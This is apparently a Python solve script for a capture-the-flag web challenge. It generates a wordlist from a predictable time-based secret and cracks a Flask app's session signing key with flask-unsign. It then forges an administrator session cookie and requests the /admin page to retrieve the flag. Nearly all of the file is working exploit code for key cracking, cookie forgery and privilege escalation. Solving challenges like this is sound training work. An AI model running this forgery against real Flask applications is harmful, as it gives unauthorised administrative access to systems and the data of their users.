import hashlib
import uuid
import json
import os
import requests

BASE_URL = 'http://chal.competitivecyber.club:9999'
SECRET_UID = uuid.UUID('31333337-1337-1337-1337-133713371337')

def gen_wordlist(wordlist: str, word_count: int):
    print(f'Generating {word_count} words to {wordlist}')

    # http://chal.competitivecyber.club:9999/status -> use the hour, the server reboots every ~5mins
    secret_base = 'secret_key_2024092219'
    digits = len(str(word_count))

    with open(wordlist, 'w+') as f:
        for i in range(0, word_count):
            w = secret_base + str(i).zfill(digits)
            w = hashlib.sha256(w.encode()).hexdigest()
            f.write(w + '\n')

def unsign_cookie(cookie: str, wordlist: str) -> str:
    cmd = f"flask-unsign --wordlist {wordlist} --unsign --cookie {cookie} --no-literal-eval"
    print(cmd)
    return os.popen(cmd).read().strip().replace("b'","").replace("'","")

def decode_cookie(cookie: str) -> dict:
    cmd = f"flask-unsign --decode --cookie '{cookie}'"
    print(cmd)
    data = os.popen(cmd).read().strip().replace("'", '"').replace('False', 'false')
    return json.loads(data)

def get_cookie(username: str, password: str) -> str:
    session = requests.Session()
    session.post(f'{BASE_URL}/', data={'username': username,'password': password})
    return session.cookies.get_dict()["session"]

def sign_cookie(secret: str, admin_uid: str) -> str:
    cmd = f"flask-unsign --sign --cookie \"{{'is_admin': True, 'uid': '{admin_uid}', 'username': 'administrator'}}\" --secret '{secret}'"
    print(cmd)
    return os.popen(cmd).read().strip()

def get_flag(cookie: str) -> str:
    cmd = f"curl {BASE_URL}/admin -H \"Cookie: session={cookie}\""
    print(cmd)
    return os.popen(cmd).read().strip()

wordlist = 'wordlist.txt'
gen_wordlist(wordlist, 9999) # max 4 digits for changing MM:SS

username = 'test'
cookie = get_cookie(username, 'test')
print('original =>', cookie)
data = decode_cookie(cookie)
print(data)

actual = data['uid']
expected = str(uuid.uuid5(SECRET_UID, username))
if actual != expected:
    print(f"Error: UID for username '{username}' does not match. '{actual}' != '{expected}'")
    exit(1)

secret = unsign_cookie(cookie, wordlist)
print('secret =>', secret)
if len(secret) == 0:
    print('Error: no secret found.')
    exit(2)

admin_uid = uuid.uuid5(SECRET_UID, 'administrator')
new_cookie = sign_cookie(secret, admin_uid)
print('new cookie =>', new_cookie)

flag = get_flag(new_cookie)
print(flag)
